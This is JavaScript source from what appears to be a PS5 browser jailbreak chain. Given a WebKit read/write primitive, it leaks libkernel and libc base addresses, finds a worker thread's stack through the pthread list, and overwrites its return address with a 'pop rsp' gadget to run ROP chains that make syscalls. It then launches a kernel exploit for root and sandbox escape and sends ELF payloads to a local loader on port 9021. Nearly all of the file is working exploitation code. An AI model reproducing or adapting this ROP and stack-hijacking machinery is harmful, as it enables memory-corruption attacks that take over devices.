function countFingerprints(p, stack, expected) {
  let count = 0;
  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
    const v = p.read8(stack.add32(offset));
    if (v.low === expected.low && v.hi === expected.hi) count++;
  }
  return count;
}

async function findWorkerStack(p, libKernelBase) {
  const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
  const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
  const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

  const plausible = (a) =>
    a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

  const head = libKernelBase.add32(OFFSET_lk__thread_list);

  // Collect every plausibility-gated 0x80000 stack.
  const stacks = [];
  let steps = 0;
  for (
    let thread = p.read8(head);
    thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
  ) {
    if (!plausible(thread)) break;

    const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
    const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
    const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
    if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
      stacks.push(stack);
    thread = next;
  }
  if (stacks.length === 0)
    throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

  // fingerprint-select. The rop_slave thread parks in the libkernel
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  for (let attempt = 0; attempt < 50; attempt++) {
    const hits = stacks.filter((stack) =>
      countFingerprints(p, stack, expected) > 0,
    );
    if (hits.length === 1) return hits[0];
    if (hits.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
      continue;
    }
    throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
  }
  throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
}

async function findWorkerReturnSlot(p, stack, libKernelBase) {
  const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
  let lastCount = 0;

  for (let attempt = 0; attempt < 50; attempt++) {
    let hit = null;
    let count = 0;
    for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
      const candidate = stack.add32(offset);
      const value = p.read8(candidate);
      if (value.low !== expected.low || value.hi !== expected.hi) continue;

      hit = candidate;
      count++;
    }
    if (count === 1) {
      return hit;
    }
    lastCount = count;
    await new Promise((resolve) => setTimeout(resolve, 1));
  }
  throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function log(message, type = "log") {
  window.writeLog(message, type);

  // Mirror the live Relapse log into the same visible screen used by Poops.
  // This is UI-only: the exploit/ROP logger above remains the source of truth.
  try {
    const scr = document.getElementById("scr");
    if (scr) {
      const text = String(message);
      const lines = scr.textContent ? scr.textContent.split("\n") : [];
      lines.push(text);
      while (lines.length > 12) lines.shift();
      scr.textContent = lines.join("\n");
      scr.scrollTop = scr.scrollHeight;
    }
  } catch (e) {}
}



const ROP_WAIT_MS = 20000;

function jbmark(tag, detail) {
  try {
    if (window.jb && typeof window.jb.mark === "function")
      window.jb.mark(tag, String(detail));
  } catch (e) {}
}

async function prepareRop(p) {
  const ctor = globalThis.__ps5NativeCtor;
  let webkitBase;
  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
    for (const offset of OFFSET_wk_host_constructor_candidates) {
      const candidate = ctor - offset;
      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
        webkitBase = candidate;
        break;
      }
    }
  }
  if (webkitBase === undefined)
    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
    Math.floor(webkitBase / 0x100000000));

  let libSceLibcInternalBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

  let libKernelBase = p.read8(
    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

  const gadgets = {};
  const syscalls = {};

  for (const gadget in wk_gadgetmap) {
    gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (const sysc in syscall_map) {
    syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
  }

  const allocations = [];

  function malloc(size, type = 4) {
    const backing =
      type === 1
        ? new Uint8Array(1000 + size)
        : new Uint32Array(0x10000 + size);
    allocations.push(backing);

    const ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function stringify(str) {
    const bufView = new Uint8Array(str.length + 1);
    for (let i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }

    const ptr = p.read8(p.leakval(bufView).add32(0x10));
    ptr.backing = bufView;
    return ptr;
  }

  function writestr(addr, str) {
    let waddr = addr.add32(0);
    if (typeof str == "string") {
      for (let i = 0; i < str.length; i++) {
        let byte = str.charCodeAt(i);
        if (byte == 0) {
          break;
        }
        p.write1(waddr, byte);
        waddr.add32inplace(0x1);
      }
    }
    p.write1(waddr, 0x0);
  }

  const worker = new Worker("./src/utils/rop_slave.js");

  async function waitForWorker() {
    return new Promise((resolve, reject) => {
      worker.onmessage = () => resolve();
      worker.onerror = () => reject(new Error("Worker failed to load"));
      worker.postMessage(0);
    });
  }

  jbmark("Worker", "waiting");
  await waitForWorker();
  jbmark("Worker", "ready");

  const workerStack = await findWorkerStack(p, libKernelBase);
  const originalContext = malloc(0x40);

  const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
  const originalReturnAddress = p.read8(returnAddress);
  const stackPointerSlot = returnAddress.add32(0x8);

  function prepareChain(chain) {
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
  }

  async function launchChain(chain) {
    const originalStackPointer = p.read8(stackPointerSlot);
    chain.push_write8(originalContext, originalReturnAddress);
    chain.push_write8(originalContext.add32(0x10), returnAddress);
    chain.push_write8(stackPointerSlot, originalStackPointer);
    chain.push(gadgets["pop rdi"]);
    chain.push(originalContext);
    chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

    p.write8(returnAddress, gadgets["pop rsp"]);
    p.write8(stackPointerSlot, chain.stack_entry_point);

    const completed = await new Promise((resolve) => {
      let settled = false;
      const finish = (value) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      worker.onmessage = () => finish(true);
      setTimeout(() => finish(false), ROP_WAIT_MS);
      worker.postMessage(0);
    });

    if (!completed)
      throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
  }

  const runtime = {
    write8: p.write8,
    write4: p.write4,
    write2: p.write2,
    write1: p.write1,
    read8: p.read8,
    read4: p.read4,
    read2: p.read2,
    read1: p.read1,
    leakval: p.leakval,
    pre_chain: prepareChain,
    launch_chain: launchChain,
    malloc,
    stringify,
    writestr,
    libSceLibcInternalBase,
    libKernelBase,
    syscalls,
    gadgets,
  };

  const chain = new worker_rop(runtime);

  const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
  p.write8(chain.return_value, JB_POISON);
  const pid = await chain.syscall(SYS_GETPID);
  if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
    throw new Error("Worker chain did not execute; the return slot is unchanged.");
  }

  if (pid.low == 0) {
    throw new Error("WebKit exploit failed.");
  }
  jbmark("Worker chain", "ready");

  return { p: runtime, chain };
}
function buildPayloadMenu() {
    const view = document.getElementById("payloads-view");
    const grid = view && view.querySelector(".payloadGrid");
    if (!view || !grid) {
        log("payload menu DOM is missing", "error");
        return null;
    }
    if (grid.children.length) return view;

    const tiles = window.PAYLOAD_TILES || [];
    if (!tiles.length) {
        log("no payload list (payloads.js missing)", "error");
        return null;
    }

    for (const t of tiles) {
        const a = document.createElement("a");
        a.href = "#";
        a.className = "btn payloadTile";
        a.tabIndex = 0;

        const name = document.createElement("span");
        name.className = "payload-btn-title";
        name.textContent = t.title;

        const description = document.createElement("span");
        description.className = "payload-btn-description";
        description.textContent = t.description;

        const info = document.createElement("span");
        info.className = "payload-btn-info";
        info.textContent = t.info || t.name;

        a.append(name, description, info);

        a.addEventListener("click", async (e) => {
            e.preventDefault();
            a.classList.remove("sent", "failed");
            a.classList.add("busy");
            const progress = document.getElementById("payloadProgress");
            if (progress) progress.textContent = "Sending " + t.title + " to the ELF loader...";
            log(t.title + ": sending ...", "info");
            try {
                const n = await window.sendElf(t.name);
                a.classList.remove("busy", "failed");
                a.classList.add("sent");
                if (progress) progress.textContent = "Sent " + t.title + " to port 9021.";
                log(t.title + ": sent " + n + " bytes to 127.0.0.1:9021", "success");
            } catch (err) {
                a.classList.remove("busy", "sent");
                a.classList.add("failed");
                if (progress) progress.textContent = "Failed to send " + t.title + ".";
                log(t.title + ": " + ((err && err.message) || err), "error");
            }
        });
        grid.appendChild(a);
    }

    return view;
}

function showPayloadMenu() {
    const view = buildPayloadMenu();
    if (!view) return;
    const consoleView = document.getElementById("console-view");
    if (consoleView) consoleView.classList.remove("selected");
    view.classList.add("selected");
    document.body.classList.add("payload-view-active");
    const consoleEl = document.getElementById("console");
    if (consoleEl) consoleEl.style.display = "none";
    const progress = document.getElementById("payloadProgress");
    if (progress) progress.textContent = "Select a payload to send it to the ELF loader.";
    void view.offsetHeight;
    requestAnimationFrame(() => { void view.offsetHeight; });
    log("elfldr is up - pick a payload", "success");
}

// Prebuild the complete payload DOM before the exploit starts.
buildPayloadMenu();
async function main(userlandRW) {
  const { p, chain } = await prepareRop(userlandRW);
  const { isElfldrListening, sendPayload } = await import("./kexp.js");

  // Payload menu calls window.sendElf(name). Bind it to this exploit session.
  window.sendElf = (name) => sendPayload(name, p, chain);
  if (await isElfldrListening(p, chain)) {
    const why = "Already jailbroken.";
    log(why, "error");
    showPayloadMenu();
    return;
  }
  const { runKernelExploit } = await import("./relapse_exploit.js");
  const result = await runKernelExploit(p, chain, log);
  if (!result || !result.done)
    throw new Error("kernel exploit did not finish");

  if (result.payloads) {
    log("kernel exploit complete", "info");
    log("elfldr is listening on port 9021", "info");
    showPayloadMenu();
  } else {
    log("kernel chain complete: root and sandbox escape are active", "info");
    /* elfldr never came up, so there is nothing to send the payload to. Report
       it instead of leaving the parent page waiting on a result forever. */
  }
}

/* Mirror the real #console into Poops-style #scr.
 * This observes the exploit's actual logger, so messages emitted by the
 * exploit modules are shown too; it does not modify the exploit/ROP path. */
(function installRelapseLogMirror() {
  const MAX_LINES = 12;
  const seen = [];
  function render() {
    const consoleEl = document.getElementById("console");
    const scr = document.getElementById("scr");
    if (!consoleEl || !scr) return;
    const entries = consoleEl.querySelectorAll(":scope > div");
    const lines = [];
    for (const el of entries) {
      const text = (el.textContent || "").trim();
      if (text) lines.push(text);
    }
    const tail = lines.slice(-MAX_LINES);
    scr.hidden = false;
    scr.textContent = tail.join("\n");
    scr.scrollTop = scr.scrollHeight;
  }
  function attach() {
    const consoleEl = document.getElementById("console");
    if (!consoleEl) return false;
    render();
    const observer = new MutationObserver(render);
    observer.observe(consoleEl, { childList: true, subtree: true, characterData: true });
    window.__relapseLogMirror = observer;
    return true;
  }
  if (!attach()) {
    const timer = setInterval(() => {
      if (attach()) clearInterval(timer);
    }, 50);
    setTimeout(() => clearInterval(timer), 10000);
  }
})();

const fwScript = document.createElement("script");
document.body.appendChild(fwScript);
fwScript.setAttribute("src", "offsets/" + window.fw_str + ".js");